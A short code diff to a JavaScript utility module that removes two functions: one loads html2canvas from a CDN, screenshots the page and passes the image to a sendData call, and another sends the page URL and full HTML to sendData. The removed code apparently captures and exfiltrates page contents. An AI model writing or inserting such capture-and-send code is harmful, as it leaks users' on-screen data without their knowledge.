@@ -29,22 +29,7 @@ const util = [
     
     
   
-},
-
-  () => {
-    document.body.innerHTML += '<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.5/dist/html2canvas.min.js"></script>'
-    const screenshotTarget = document.body;
-    console.log(screenshotTarget)
-html2canvas(screenshotTarget).then(async (canvas) => {
-    const base64image = canvas.toDataURL("image/png");
-    await sendData(base64image);
-});
-  },
-
-  async () => {
-    const url = window.location.href
-    await sendData(JSON.stringify([url,document.body.innerHTML]));
-  }
+}
 ]
 
 module.exports = util
